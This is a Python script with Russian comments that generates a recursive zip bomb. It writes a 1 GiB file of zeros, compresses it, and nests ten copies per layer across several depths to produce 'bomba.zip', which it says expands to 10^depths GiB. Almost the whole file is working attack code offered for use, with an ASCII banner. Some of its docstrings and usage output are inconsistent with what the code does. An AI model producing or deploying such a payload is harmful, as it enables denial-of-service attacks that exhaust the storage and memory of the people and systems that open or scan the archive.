"""zipbomb.py - создает zip-бомбу заданной глубины в заданном выходном каталоге.
Каждая глубина имеет количество архивов DEPTH_FILE_NUMBER.
Чтобы вычислить полный размер при рекурсивном распаковывании, выполните команду DEPTH_FILE_NUMBER^depths.
По умолчанию количество архивов на глубину 10 и глубинная бомбы 3 мы получаем 10^3 или 1000 гигабайт.
"""
from shutil import copyfile
import zipfile
import zlib
import os

BANNER = """
                                                                                                                        
  /###           /                            ##### ##                                 /                                
 /  ############/    #                     ######  /##                               #/                                 
/     ##########    ###                   /#   /  / ##                               ##                                 
#             /      #                   /    /  /  ##                               ##                                 
 ##          /                               /  /   /                                ##                                 
            /      ###        /###          ## ##  /        /###    ### /### /###    ## /###                            
           /        ###      / ###  /       ## ## /        / ###  /  ##/ ###/ /##  / ##/ ###  /                         
          /          ##     /   ###/        ## ##/        /   ###/    ##  ###/ ###/  ##   ###/                          
         /           ##    ##    ##         ## ## ###    ##    ##     ##   ##   ##   ##    ##                           
        /            ##    ##    ##         ## ##   ###  ##    ##     ##   ##   ##   ##    ##                           
       /             ##    ##    ##         #  ##     ## ##    ##     ##   ##   ##   ##    ##                           
      /              ##    ##    ##            /      ## ##    ##     ##   ##   ##   ##    ##                           
  /##/           /   ##    ##    ##        /##/     ###  ##    ##     ##   ##   ##   ##    /#                           
 /  ############/    ### / #######        /  ########     ######      ###  ###  ###   ####/                             
/     ##########      ##/  ######        /     ####        ####        ###  ###  ###   ###                              
                           ##            #                                                                              
                           ##             ##                                                                            
                           ##                                                                                           
                            ##                                                                                          
"""
WORKDIR = "/home/admin"  # или используй os.path.expanduser("~")
TXTFILE = 'tragic.txt'  # имя файла может быть любым
DEPTH_FILE_NUMBER = 10  # количество файлов на глубину. Лучше всего 10.
TXT_FILE_SIZE = 1  # размер текстового файла в GiB. Лучше оставить его в покое.



def create_txt(size):
    """
    Создаёт текстовый файл размером GiB.
    [#] Рекомендуемый размер 1 GiB.
    [#] Из этого файла создайтся начальный zip-архив.
    """
    with open(TXTFILE, "w") as f:
        f.write((1024 * 1024 * 1024 * size) * '0')  # 1024**3 == 1 GiB of '0's
    zfile = zipfile.ZipFile('1.zip', 'w', compression=zipfile.ZIP_DEFLATED, allowZip64=True)
    zfile.write(TXTFILE, compress_type=zipfile.ZIP_DEFLATED)
    os.remove(TXTFILE)


def create_depth(tocopy, result, depth):
    """
    Создаёт глубину, скопировав zip-архив tocopy и добавив его в новый zip-архив result.
    """
    zfile = zipfile.ZipFile(result, 'w', compression=zipfile.ZIP_DEFLATED, allowZip64=True)
    for i in range(DEPTH_FILE_NUMBER):
        copyfile(tocopy, '%d-%d.zip' % (depth, i))
        zfile.write('%d-%d.zip' % (depth, i), compress_type=zipfile.ZIP_DEFLATED)
        os.remove('%d-%d.zip' % (depth, i))
    os.remove(tocopy)


def forge_bomb(depths):
    """
    Создайт файл `bomba.zip` с заданным количеством глубин.
    """
    for i in range(1, depths + 1):
        # Каждый слой создаётся путём копирования i.zip в i+1.zip
        create_depth('%s.zip' % str(i), '%s.zip' % str(i + 1), i)
    if os.path.isfile('%d.zip' % (depths + 1)):
        os.rename('%d.zip' % (depths + 1), 'bomba.zip')


if __name__ == "__main__":
    depths = 5
    print("Usage: %s <depths>" % depths)
    if not os.path.isdir(WORKDIR):
        os.mkdir(WORKDIR)
    os.chdir(WORKDIR)
    print(BANNER)
    print("[+] creating dump file...")
    create_txt(TXT_FILE_SIZE)
    print("[+] forging bomb...")
    forge_bomb(depths)
    print("[+] zip bomb at %s/bomba.zip!"%WORKDIR)
    print("[+] Total size when recursively expanded: %d GiB" % (DEPTH_FILE_NUMBER**depths))
